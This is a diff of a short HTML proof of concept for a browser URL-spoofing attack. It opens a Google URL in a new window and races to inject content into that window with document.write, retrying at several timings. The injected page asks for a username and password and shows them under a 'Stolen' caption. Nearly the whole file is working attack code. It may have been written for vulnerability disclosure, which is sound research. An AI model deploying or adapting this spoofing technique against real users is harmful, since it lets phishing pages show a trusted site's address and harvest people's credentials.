@@ -1,30 +1,35 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <button onclick="spoof()">Click to spoof</button>
+<body>
+  <button onclick="spoof()">Click to spoof</button>
 
-    <script>
-      function spoof() {
-        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
-        let win = window.open("https://www.google.com/gen_204", "_blank");
+  <script>
+    function spoof() {
+      let win = window.open("https://www.google.com/gen_204", "_blank");
+      let payload = `
+        <h1>This is NOT Google!</h1>
+        <button onclick="
+          let u=prompt('Username?'); 
+          let p=prompt('Password?'); 
+          alert('Stolen: '+u+' / '+p);
+        ">Click Me</button>
+      `;
 
-        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
-        setTimeout(() => {
-          try {
-            win.document.write(`
-  <h1>This is not Google!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
-            `);
-            win.document.close();
-          } catch (e) {
-            console.warn("Blocked by browser protections:", e);
-          }
-        }, 50);
-      }
-    </script>
-  </body>
+      let inject = () => {
+        try {
+          win.document.open();
+          win.document.write(payload);
+          win.document.close();
+        } catch (e) {
+          console.log('Blocked:', e);
+        }
+      };
+
+      // Multiple attempts to beat load race condition
+      setTimeout(inject, 10);
+      setTimeout(inject, 50);
+      setTimeout(inject, 100);
+    }
+  </script>
+</body>
 </html>
